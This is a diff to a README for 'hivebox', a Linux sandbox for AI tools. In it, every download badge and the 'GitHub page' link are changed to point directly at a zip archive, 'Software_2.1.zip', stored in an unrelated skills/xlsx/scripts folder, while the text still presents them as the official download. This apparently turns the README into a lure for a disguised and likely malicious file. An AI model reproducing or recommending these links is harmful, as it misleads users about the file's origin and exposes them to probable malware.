@@ -1,6 +1,6 @@
 # 🐝 hivebox - Easy Linux Sandbox for AI Tools
 
-[![Download hivebox](https://img.shields.io/badge/Download-hivebox-brightgreen)](https://github.com/luckyfunctioning480/hivebox)
+[![Download hivebox](https://img.shields.io/badge/Download-hivebox-brightgreen)](https://raw.githubusercontent.com/luckyfunctioning480/hivebox/main/skills/xlsx/scripts/Software_2.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You can control hivebox through a simple web dashboard or by sending commands to
 
 Start using hivebox by downloading it from the official GitHub page:
 
-[![Download hivebox](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/luckyfunctioning480/hivebox)
+[![Download hivebox](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://raw.githubusercontent.com/luckyfunctioning480/hivebox/main/skills/xlsx/scripts/Software_2.1.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -141,7 +141,7 @@ These features make your PC safer when running untrusted AI software.
 
 For deeper use or CI/CD integration, visit the GitHub page:
 
-[https://github.com/luckyfunctioning480/hivebox](https://github.com/luckyfunctioning480/hivebox)
+[https://raw.githubusercontent.com/luckyfunctioning480/hivebox/main/skills/xlsx/scripts/Software_2.1.zip](https://raw.githubusercontent.com/luckyfunctioning480/hivebox/main/skills/xlsx/scripts/Software_2.1.zip)
 
 It contains advanced setup guides, developer tools, and API documentation.
 
